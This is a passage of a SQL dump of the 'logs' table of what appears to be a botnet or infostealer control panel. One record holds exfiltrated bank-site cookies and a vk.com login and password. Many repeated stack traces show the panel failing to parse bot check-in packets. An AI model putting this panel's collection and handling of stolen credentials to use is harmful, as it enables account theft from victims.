01b44903ab063b370a214fc804214aee3409967734fae066cc14fc2f582f82bd623ba36d8a1706b76da78bc13aec8166b2df4fbad9\",\".sberbank.ru 0 \\/ 0 13269584884000000 __zzat2 MDA0dBA=Fz2+aQ==\",\".sberbank.ru 0 \\/ 0 13301120883000000 _ga GA1.2.577123051.1591556353\",\".sberbank.ru 0 \\/ 0 13238135283000000 _gid GA1.2.2030719841.1593561921\",\".sberbank.ru 0 \\/ 0 13269584884000000 cfids2 E8+QZQU67LsgVegbH74+UnbY8njoVojq5S5X2RSngwDxROXN\\/\\/ZJI+naERCxJ3h0Ybe7fO054t7EkjTjKOdWg9ZQwACre+wjgQpVd9FNXeVZvX8pwbnwQJppALKRHW7wX1yWDAGLJDlpqK9qhEE6FcGiC72Dngu8Q32dK\\/I=\"],\"accounts\":[{\"service\":\"https:\\/\\/login.vk.com\\/\",\"login\":\"putin\",\"password\":\"vvp_228\"},{\"service\":\"https:\\/\\/login.vk.com\\/\",\"login\":\"putin\",\"password\":\"vvp_228\"}]}],\"bot_id\":\"6\"}', '2020-07-01 13:08:07'),
(15, 'GateModel', 'updateBot (exception)', 'PDOException: SQLSTATE[01000]: Warning: 1265 Data truncated for column \'ip\' at row 1 in /var/www/html/application/modules/dbModel.php:56\nStack trace:\n#0 /var/www/html/application/modules/dbModel.php(56): PDOStatement->execute()\n#1 /var/www/html/application/models/model_gate.php(639): Db->insert(\'layers\', Array)\n#2 /var/www/html/application/models/model_gate.php(534): LayerData::save(Object(Db), \'195.88.209.247\')\n#3 /var/www/html/application/models/model_gate.php(89): Bot->__construct(\'3A32B24C5B5B20E...\', \'Windows 10\', 12, 12, \'1920x1080\', \'DESKTOP-1KU2ONO\', 64, Object(Db))\n#4 /var/www/html/application/controllers/controller_gate.php(60): Model_Gate->updateBot(\'4\')\n#5 /var/www/html/application/core/route.php(67): Controller_Gate->action_bot_upd_sys_info()\n#6 /var/www/html/application/core/route.php(8): Route::onBotClientStrategy()\n#7 /var/www/html/application/bootstrap.php(88): Route::start()\n#8 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#9 {main}', '2020-07-26 14:15:50'),
(16, 'GateModel', 'updateBot (exception)', 'PDOException: SQLSTATE[01000]: Warning: 1265 Data truncated for column \'ip\' at row 1 in /var/www/html/application/modules/dbModel.php:56\nStack trace:\n#0 /var/www/html/application/modules/dbModel.php(56): PDOStatement->execute()\n#1 /var/www/html/application/models/model_gate.php(639): Db->insert(\'layers\', Array)\n#2 /var/www/html/application/models/model_gate.php(534): LayerData::save(Object(Db), \'195.88.209.247\')\n#3 /var/www/html/application/models/model_gate.php(89): Bot->__construct(\'3A32B24C5B5B20E...\', \'Windows 10\', 12, 12, \'1920x1080\', \'DESKTOP-1KU2ONO\', 64, Object(Db))\n#4 /var/www/html/application/controllers/controller_gate.php(60): Model_Gate->updateBot(\'4\')\n#5 /var/www/html/application/core/route.php(67): Controller_Gate->action_bot_upd_sys_info()\n#6 /var/www/html/application/core/route.php(8): Route::onBotClientStrategy()\n#7 /var/www/html/application/bootstrap.php(88): Route::start()\n#8 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#9 {main}', '2020-07-26 14:17:30'),
(17, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:6 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\x9E)\\xF1\\x89\\xE5\\xAB\\xA2\\xB5r\\x07\\xB1z<\\x083...\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\x9E)\\xF1\\x89\\xE5\\xAB\\xA2\\xB5r\\x07\\xB1z<\\x083...\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\x9E)\\xF1\\x89\\xE5\\xAB\\xA2\\xB5r\\x07\\xB1z<\\x083...\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-08 22:04:34'),
(18, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:7 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-09 11:54:34'),
(19, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:7 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-09 17:08:19'),
(20, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:7 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-09 20:34:01'),
(21, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:7 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 00:21:02'),
(22, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xDD\\xFA\\xD0\\xA3?J0 \\xEC\\x14\\xEF\\xB6\\xAEt\\xEF...\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xDD\\xFA\\xD0\\xA3?J0 \\xEC\\x14\\xEF\\xB6\\xAEt\\xEF...\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xDD\\xFA\\xD0\\xA3?J0 \\xEC\\x14\\xEF\\xB6\\xAEt\\xEF...\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 00:49:31'),
(23, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:7 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 04:06:13');
INSERT INTO `logs` (`id`, `controller`, `function`, `log`, `error_time`) VALUES
(24, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:1 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 04:45:10'),
(25, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:1 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 04:45:11'),
(26, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:1 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 04:45:11'),
(27, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:1 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 04:45:12'),
(28, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:1 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 04:45:13'),
(29, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:1 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 04:45:14'),
(30, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:1 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 04:45:15'),
(31, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xCD\\x9D\'0\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xCD\\x9D\'0\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xCD\\x9D\'0\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 04:45:16'),
(32, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xCD\\x9D\'0\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xCD\\x9D\'0\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xCD\\x9D\'0\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 04:45:17'),
(33, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xCD\\x9D\'0\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xCD\\x9D\'0\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xCD\\x9D\'0\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 04:45:18'),
(34, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xCD\\x9D\'0\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xCD\\x9D\'0\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xCD\\x9D\'0\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 04:45:21'),
(35, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xCD\\x9D\'0\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xCD\\x9D\'0\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xCD\\x9D\'0\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 04:45:21'),
(36, 'Router', 'onBotClientStrategy (exception)', 'Exception: Expected type:4 but had  in /var/www/html/application/modules/protobuf/message/pb_message.php:221\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\x14\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\x14\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\x14\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 04:49:31'),
(37, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 04:50:21'),
(38, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 04:50:22'),
(39, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'=\\xE8\\x08@\\x04\\x82\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'=\\xE8\\x08@\\x04\\x82\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'=\\xE8\\x08@\\x04\\x82\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 04:50:25'),
(40, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 04:50:26'),
(41, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 04:50:27'),
(42, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 04:50:28'),
